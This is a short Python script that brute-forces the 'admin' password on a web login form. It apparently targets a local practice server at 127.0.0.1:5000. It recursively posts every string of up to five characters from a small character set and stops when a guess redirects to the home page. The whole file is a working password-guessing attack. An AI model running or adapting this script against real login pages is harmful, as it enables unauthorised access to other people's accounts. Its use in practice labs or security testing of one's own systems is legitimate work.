import requests
import sys

url = "http://127.0.0.1:5000/login"


def brute(string, length, charset):
    if len(string) == length:
        return
    for char in charset:

        temp = string + char
        print(temp)

        password = temp.strip()
        http = requests.post(url, data={"login": "admin", "password": password})
        # print(http)
        if http.url == 'http://127.0.0.1:5000/home':
            print('==================================Password', password)
            sys.exit()

        if http.url != 'http://127.0.0.1:5000/home':
            brute(temp, length, charset)

    return print('----------------------------end')


brute("", 5, "abcdefmin123ABC")
